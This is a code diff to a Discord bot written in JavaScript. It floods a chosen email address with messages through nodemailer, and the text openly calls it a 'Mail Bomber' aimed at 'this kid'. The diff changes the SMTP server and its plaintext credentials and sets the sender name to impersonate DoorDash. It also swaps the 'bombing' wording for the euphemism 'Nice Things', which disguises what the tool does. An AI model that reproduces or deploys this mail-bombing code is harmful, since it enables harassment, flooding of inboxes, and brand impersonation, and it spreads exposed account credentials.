@@ -23,7 +23,7 @@ client.on("message", async msg => {
   if (command === "send") {
     if (spamming == true)
       return msg.reply(
-        "A mail bombing is already active! Please use '!stop' before a new attack"
+        "A mail Nice Things is already active! Please use '!stop' before a new attack"
       );
 
     if (!args[0]) return msg.reply("You need to insert a mail target!");
@@ -41,18 +41,18 @@ client.on("message", async msg => {
     var mailtxt = args[1];
 
     let transporter = nodemailer.createTransport({
-      host: "smtp.libero.it", //smtp server
-      port: 25,
-      secure: false, // true for 465, false for other ports
+      host: "mail.cock.li", //smtp server
+      port: 465,
+      secure: true, // true for 465, false for other ports
       auth: {
-        user: "fsociety0101@libero.it", // mail
-        pass: "mrrobot666" // password
+        user: "doordash@getbackinthe.kitchen", // mail
+        pass: "Doordashyum1!" // password
       }
     });
 
     // setup email data with unicode symbols
     let mailOptions = {
-      from: '"Mr.RObot" <fsociety0101@libero.it>', // sender address
+      from: '"DoorDash" <doordash@getbackinthe.kitchen>', // sender address
       to: mailto, // list of receivers
       subject: randomLetters(8), // Subject line
       text: mailtxt, // plain text body
@@ -79,12 +79,12 @@ client.on("message", async msg => {
           name: client.user.username,
           icon_url: client.user.avatarURL
         },
-        title: "Bombing",
+        title: "Package",
         description: "Bot Developed By Mental#1424",
         fields: [
           {
-            name: "Let's Bomb This Kid!",
-            value: "Bombing In Progress..."
+            name: "Let's Send Nice Things This Kid!",
+            value: "Nice Things In Progress..."
           },
           {
             name: "Target Mail",
@@ -94,14 +94,14 @@ client.on("message", async msg => {
         timestamp: new Date(),
         footer: {
           icon_url: client.user.avatarURL,
-          text: "© Discord Mail Bomber"
+          text: "© Discord Mail Nice Things"
         }
       }
     });
   }
 
   if (command === "stop") {
-    if (spamming == false) return msg.reply("There isn't any active bombing!");
+    if (spamming == false) return msg.reply("There isn't any active Nice Things!");
     msg.channel.send("Stopped! Bot Shutdown");
     client.destroy();
   }
@@ -133,17 +133,17 @@ client.on("message", async msg => {
 
           {
             name: "Stop",
-            value: "Use !stop for stopping the mail bombing"
+            value: "Use !stop for stopping the mail Nice Things"
           }
         ],
         timestamp: new Date(),
         footer: {
           icon_url: client.user.avatarURL,
-          text: "© Discord Mail Bomber"
+          text: "© Discord Nice Things"
         }
       }
     });
   }
 });
 
-client.login("NoU");
+client.login(process.env.TOKEN);
